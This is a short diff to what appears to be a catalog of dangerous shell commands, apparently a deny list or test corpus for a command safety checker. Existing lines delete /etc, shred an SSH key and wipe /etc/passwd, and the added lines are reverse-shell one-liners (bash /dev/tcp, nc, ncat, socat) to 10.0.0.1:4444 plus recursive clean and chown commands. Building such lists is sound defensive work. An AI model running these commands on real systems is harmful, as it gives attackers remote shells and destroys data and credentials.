@@ -68,3 +68,10 @@ find /etc -delete
 shred -u ~/.ssh/id_rsa
 truncate -s 0 /etc/passwd
 echo / | xargs rm -rf
+# --- 0.8.6 catalog: reverse shells + destructive commands ---
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+nc -e /bin/sh 10.0.0.1 4444
+ncat --exec /bin/bash 10.0.0.1 4444
+socat exec:bash,pty,stderr tcp:10.0.0.1:4444
+git clean -fdx
+chown -R nobody /
